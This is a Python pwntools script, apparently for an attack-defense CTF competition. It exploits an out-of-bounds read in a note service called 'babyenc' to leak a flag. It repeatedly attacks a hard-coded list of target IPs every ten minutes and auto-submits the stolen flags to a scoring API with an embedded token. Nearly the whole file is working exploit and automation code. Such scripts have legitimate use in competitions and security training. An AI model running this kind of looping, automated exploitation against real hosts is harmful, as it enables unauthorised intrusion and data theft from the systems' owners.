#!/usr/bin/env python3
from pwn import *
import argparse
import re
import time
import json
import urllib.request
import urllib.error
import logging
import sys


DEFAULT_TARGETS = [
    "172.29.41.42",
    "172.29.41.43",
    "172.29.41.44",
    "172.29.41.45",
]

FLAG_API_URL = "http://10.2.60.1/api/ct/web/awd_race/race/26c4e794b2f1612181e55422e8ddc718/flag/robot/"
TOKEN = "67b0d49867ee5e16595959bac3fd1520"


def parse_args():
    p = argparse.ArgumentParser(description="Solve babyenc via OOB vault read and auto-submit flags")
    p.add_argument("--binary", default="babyenc/chall/chall", help="Path to local binary")
    p.add_argument("--host", help="Remote host (overrides default target list)")
    p.add_argument("--port", type=int, help="Remote port")
    p.add_argument("--once", action="store_true", help="Run once and exit (don't loop every 10 minutes)")
    p.add_argument("--targets", help="Comma-separated list of target IPs (default embedded)")
    return p.parse_args()


def start(binary_path, host, port):
    if host and port:
        return remote(host, port)
    return process(binary_path)


def wait_menu(io):
    io.recvuntil(b"8) exit")


def choose(io, n):
    wait_menu(io)
    io.sendline(str(n).encode())


def create_note(io, idx, length, data_hex):
    choose(io, 1)
    io.sendlineafter(b"index:", str(idx).encode())
    io.sendlineafter(b"length:", str(length).encode())
    io.sendlineafter(b"data hex:", data_hex)


def show_note(io, idx):
    choose(io, 3)
    io.sendlineafter(b"index:", str(idx).encode())
    io.recvuntil(b"audit(hex):")
    line = io.recvline().strip()
    # Keep only hex characters in case of stray output.
    line = re.sub(rb"[^0-9a-fA-F]", b"", line)
    return bytes.fromhex(line.decode())


def exploit_io(io):
    # Note[0] = length, Note[1] = offset into vault.
    create_note(io, idx=1, length=2, data_hex=b"ff30")
    leak = show_note(io, idx=1)
    flag = leak.split(b"\x00", 1)[0]
    return flag.decode(errors="replace")


def submit_flag(flag: str) -> bool:
    payload = json.dumps({"flag": flag, "token": TOKEN}).encode()
    req = urllib.request.Request(FLAG_API_URL, data=payload, headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode(errors="replace")
            try:
                j = json.loads(body)
                logging.info("Submit response: %s", j)
            except Exception:
                logging.info("Submit response (non-JSON): %s", body)
            return True
    except urllib.error.HTTPError as e:
        logging.error("HTTPError while submitting flag: %s", e.read().decode(errors="replace"))
    except Exception as e:
        logging.exception("Error submitting flag: %s", e)
    return False


def exploit_target(binary, host, port):
    io = None
    try:
        io = start(binary, host, port)
        return exploit_io(io)
    finally:
        if io:
            try:
                io.close()
            except Exception:
                pass


def main():
    args = parse_args()
    logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(message)s")
    context.binary = ELF(args.binary)

    if args.targets:
        targets = [t.strip() for t in args.targets.split(",") if t.strip()]
    elif args.host:
        targets = [args.host]
    else:
        targets = DEFAULT_TARGETS

    # If we have remote targets ensure port is provided
    if args.port is None and any(t not in ("127.0.0.1", "localhost") for t in targets):
        logging.error("Remote targets present but --port is not set. Provide --port to connect to remote services.")
        sys.exit(1)

    try:
        while True:
            for host in targets:
                try:
                    logging.info("Targeting %s:%s", host, args.port)
                    flag = exploit_target(args.binary, host if host else None, args.port)
                    if not flag:
                        logging.warning("No flag recovered from %s", host)
                        continue
                    logging.info("Recovered flag from %s: %s", host, flag)
                    submit_flag(flag)
                    # small pause to avoid any accidental burst to the API
                    time.sleep(0.2)
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    logging.exception("Error while exploiting %s: %s", host, e)

            if args.once:
                break
            logging.info("Sleeping 10 minutes before next run")
            time.sleep(600)
    except KeyboardInterrupt:
        logging.info("Interrupted by user, exiting")


if __name__ == "__main__":
    main()
